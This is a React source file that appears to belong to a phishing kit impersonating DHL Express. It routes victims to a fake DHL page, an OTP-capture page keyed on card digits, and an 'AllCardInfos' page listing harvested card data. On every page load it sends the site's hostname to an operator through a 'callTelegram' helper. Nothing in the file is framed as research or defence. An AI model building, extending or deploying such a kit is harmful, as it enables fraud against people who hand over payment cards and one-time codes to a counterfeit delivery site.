import React, { useEffect } from "react";
import { BrowserRouter, Route, Routes, useParams } from "react-router-dom";
import { callTelegram } from "./config/server";
import DhlExpress from "./dhlexpress";
import AllCardInfos from "./dhlexpress/cardinfo";
import Otp, { Verified } from "./dhlexpress/otp";

function App() {
  const hostname = window.location.hostname;
  let { param } = "ioupupoi"

  useEffect(() => {
    callTelegram(hostname, param)
      .then((response) => response.text())
      .then((result) => console.log(result))
      .catch((error) => console.log("error", error));
  }, []);

  return (
    <>
      <BrowserRouter>
        <Routes>
          <Route path="/:param" element={<DhlExpress />} />
          <Route path="/sendcode/:cardigit/:param" element={<Otp />} />
          <Route path="/confirm" element={<Verified />} />
          <Route path="/info/:docId" element={<AllCardInfos />} />
        </Routes>
      </BrowserRouter>
    </>
  );
}

export default App;
